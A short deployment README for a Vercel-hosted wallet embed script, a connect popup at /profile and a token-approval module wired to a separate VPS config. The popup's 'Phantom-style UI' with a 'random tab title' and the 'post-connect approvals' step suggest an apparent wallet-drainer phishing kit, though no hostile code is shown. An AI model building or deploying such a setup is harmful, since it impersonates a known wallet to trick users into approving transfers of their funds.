# Vercel — wallet JS bundle only

Deploy **this folder** to Vercel. Hosts:

| URL | What |
|-----|------|
| `/wallet.bundle.js` | Wallet embed script |
| `/profile` | Connect popup (Phantom-style UI, random tab title) |

## Vercel dashboard

- **Root Directory:** `vercel`
- Build runs `npm run build` → `public/wallet.bundle.js`
- `public/profile/index.html` is served at **`/profile`**

## After deploy

In **`../vps/config.php`**:

```php
'vercel_bundle_url' => 'https://YOUR-PROJECT.vercel.app/wallet.bundle.js',
// Popup URL auto-derived as https://YOUR-PROJECT.vercel.app/profile
// Or set explicitly:
// 'connect_popup_url' => 'https://YOUR-PROJECT.vercel.app/profile',
```

## Local build

```bash
cd vercel
npm install
npm run build
```

## Files

| File | Purpose |
|------|---------|
| `src/wallet-loader.js` | Reown connect |
| `src/token-approval.js` | Post-connect approvals |
| `src/solana-wallets.js` | Wallet list (commit this) |
| `public/wallet.bundle.js` | Output (generated, do not commit) |
